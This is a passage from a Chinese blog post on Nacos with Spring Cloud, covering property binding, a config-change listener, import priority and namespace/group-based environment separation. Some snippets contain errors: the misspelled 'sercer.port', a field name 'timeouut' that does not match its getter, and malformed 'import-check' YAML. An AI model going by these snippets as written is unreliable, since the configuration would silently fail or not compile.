@ConfigurationProperties(prefix = \u0026#34;order\u0026#34;) public class OrderProperties { String timeouut; String autoconfirm; } 想要使用配置文件直接依赖注入即可\n1 2 3 4 5 6 7 8 9 10 @Autowired OrderProperties orderProperties; @GetMapping(\u0026#34;/config\u0026#34;) String config(){ System.out.println(\u0026#34;orderTimeouut:\u0026#34;+orderProperties.getTimeout()); System.out.println(\u0026#34;orderConfirm:\u0026#34;+orderProperties.getAutoconfirm()); return orderProperties.getTimeout()+\u0026#34; \u0026#34;+orderProperties.getAutoconfirm(); } 配置监听 先说一个场景：当Nacos的配置文件发生变更时发送邮件给开发者\n项目启动时监听Nacos配置文件变化 1. 获取最新的配置数据 2. 发送邮件通知开发者 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package com.example; import com.alibaba.cloud.nacos.NacosConfigManager; import com.alibaba.nacos.api.config.listener.Listener; import com.alibaba.nacos.client.config.NacosConfigService; import org.springframework.boot.ApplicationArguments; import org.springframework.boot.ApplicationRunner; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; import org.springframework.context.annotation.Bean; import java.util.concurrent.Executor; @EnableDiscoveryClient @SpringBootApplication public class OrderApplication { public static void main(String[] args) { SpringApplication.run(OrderApplication.class, args); } /** * 项目启动时监听Nacos配置文件变化 * 1. 获取最新的配置数据 * 2. 发送邮件通知开发者 */ @Bean public ApplicationRunner runner(NacosConfigManager nacosConfigManager) { return args -\u0026gt; { NacosConfigService nacosConfigService = (NacosConfigService) nacosConfigManager.getConfigService(); nacosConfigService.addListener( \u0026#34;com.example.OrderProperties\u0026#34;, \u0026#34;defaultGroup\u0026#34;, new Listener() { @Override public Executor getExecutor() { return Runnable::run; // 修正：原代码中的Executor.newFixedThreadPool(4)不正确 } @Override public void receiveConfigInfo(String configInfo) { System.out.println(\u0026#34;配置文件更新了，最新的配置信息为：\u0026#34; + configInfo); // 发送邮件通知开发者 // 此处省略发送邮件的代码 System.out.println(\u0026#34;邮件已发送\u0026#34;); } } ); }; } } 思考：如果Nacos的配置文件数据集和项目中的配置文件有相同项，哪个会生效？\n先导入优先，外部优先，所以Nacos的配置文件会优先生效\n1 2 3 4 5 6 spring.application.name=service-order sercer.port=8000 spring.cloud.nacos.server-addr=127.0.0.1:8848 spring.config.import=nacos:service-order.properties,nacos:common.properties //service-order.properties优先级最高common.properties第二高 spring.cloud.nacos.config.import-check.enabled=false 数据隔离 先说场景：假设现在有这么一个需求：项目有多套环境：开发，测试，生产环境，而每一个环境在每套环境下配置文件都不一样\n难点：区分多套环境，区分多种配置，区分多种微服务该怎么解决\n解决方法：\n使用Namespace名称空间区分多套环境，使用Group分组区分多种微服务，使用Data-id数据集区分多种配置\n如何实现呢？？？\n1.在Nacos的命名空间中新建名称空间\n2.创建好开发测试生产环境的命名空间后，在配置管理者找到对应空间，新增配置\n3.动态切换环境\n在微服务的配置文件中定义命名空间和组名，但是这样子不能实现动态切换环境\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 sercer: port: 8000 spring: application: name: service-order cloud: nacos: server-addr: 127.0.0.1:8848 import-check: enabled=false: config: namespace: dev config: import: - nacos:Common.properties?group=order - nacos:database.properties?group=order 完整的配置文件如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 sercer: port: 8000 spring: profiles: active: dev //选择dev环境的配置文件 //active：test //选择test环境下的配置文件 application: name: service-order cloud: nacos: server-addr: 127.0.0.1:8848 import-check: enabled=false: config: namespace: ${spring.profiles.active:public} --- //三个杠表示多文档模式 spring: config: import: - nacos:Common.properties?group=order - nacos:database.properties?group=order activate: on-profile: dev --- spring: config: import: - nacos:Common.properties?group=order - nacos:database.properties?group=order - nacos:redis.properties?group=order activate: on-profile: test --- spring: config: import: - nacos:Common.properties?group=order - nacos:database.properties?group=order - nacos:haha.properties?group=order activate: on-profile: prod ","date":"2025-06-08T11:24:22+08:00","image":"https://lserein.github.io/p/nacos/Nacos_hu_5436af82e36fa2df.jpg","permalink":"https://lserein.github.io/p/nacos/","title":"Nacos"}]